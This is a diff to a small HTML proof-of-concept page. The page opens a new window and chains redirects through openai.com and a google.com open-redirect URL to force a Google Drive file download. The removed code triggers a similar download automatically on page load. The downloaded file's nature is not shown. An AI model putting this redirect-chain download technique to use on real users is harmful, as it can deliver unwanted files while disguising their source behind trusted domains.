@@ -1,17 +1,29 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="UTF-8">
+  <title>poc</title>
+  <script>
+    function chainRedirect(w, urls, index = 0) {
+      if (index < urls.length) {
+        w.location.replace(urls[index]);
+        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
+      }
+    }
+
+    function startRedirect() {
+      let w = window.open("");
+      setTimeout(() => {
+        chainRedirect(w, [
+        "https://openai.com",
+        "https://google.com/url?q=https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918",
+        "https://google.com/url?q=https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918",
+        ]);
+      }, 1000);
+    }
+  </script>
+</head>
 <body>
-
-<script>
-window.onload = function() {
-
-  setTimeout(function() {
-    window.location.href =
-    "https://drive.usercontent.google.com/download?id=1WUuWc3AqWbL39mOidnN4sQaXHLFIuGrL&export=download&authuser=0&confirm=t&uuid=6b1cae39-db68-475d-8887-3341c60b6a65&at=AGN2oQ2zUpV2XdxkZMYS6stXYkI7:1773903446821";
-  },1000);
-
-}
-</script>
-
+  <button onclick="startRedirect()">Start</button>
 </body>
 </html>
